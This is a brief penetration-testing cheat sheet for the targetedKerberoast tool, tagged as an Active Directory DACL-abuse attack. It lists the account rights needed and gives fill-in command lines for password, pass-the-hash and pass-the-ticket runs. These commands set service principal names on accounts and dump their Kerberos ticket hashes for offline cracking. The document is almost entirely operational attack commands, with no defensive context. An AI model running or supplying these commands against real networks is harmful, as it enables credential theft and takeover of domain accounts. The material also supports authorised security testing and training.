# targetedKerberoast

% dacl, GenericWrite, https://github.com/ShutdownRepo/targetedKerberoast
#plateform/linux #target/remote #cat/ATTACK/AD/DACL-ABUSE

## requierements
```
GenericAll, GenericWrite, WriteProperty or Validated-SPN 
```

## targetedKerberoast (cred)
--request-user username (just the username, no domain needed)
-o file       to write ciphers in JtR/hashcat format
--use-ldaps   Use LDAPS instead of LDAP
--only-abuse  Ignore accounts that have an SPN
--no-abuse    Don't attempt targeted Kerberoasting
```
targetedKerberoast.py -v -d <domain_fqdn> -u <user> -p <password> --dc-ip <dc_ip>
```

## targetedKerberoast (pth)
--request-user username (just the username, no domain needed)
-o file       to write ciphers in JtR/hashcat format
--use-ldaps   Use LDAPS instead of LDAP
--only-abuse  Ignore accounts that have an SPN
--no-abuse    Don't attempt targeted Kerberoasting
```
targetedKerberoast.py -v -d <domain_fqdn> -u <user> -H <nt_hash> --dc-ip <dc_ip>
```

## targetedKerberoast (ptt)
--request-user username (just the username, no domain needed)
-o file       to write ciphers in JtR/hashcat format
--use-ldaps   Use LDAPS instead of LDAP
--only-abuse  Ignore accounts that have an SPN
--no-abuse    Don't attempt targeted Kerberoasting
```
export KRB5CCNAME=<ccache>
targetedKerberoast.py -v -d <domain_fqdn> -k --no-pass --dc-ip <dc_ip>
```


